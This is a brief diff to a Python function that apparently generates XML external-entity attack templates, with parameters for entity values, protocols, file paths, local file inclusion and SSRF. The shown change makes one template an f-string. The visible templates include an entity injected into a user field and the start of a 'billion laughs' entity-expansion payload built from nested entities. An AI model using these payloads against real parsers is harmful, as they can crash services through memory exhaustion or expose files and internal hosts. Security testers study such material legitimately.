@@ -8,7 +8,7 @@ def update_templates(entityv, proto, filep, url_lfi, ssrfp):
             <lastName>&{entityv};</lastName>
             </userInfo>
         """,
-        """
+        f"""
             <?xml version="1.0" >
             <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
             <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
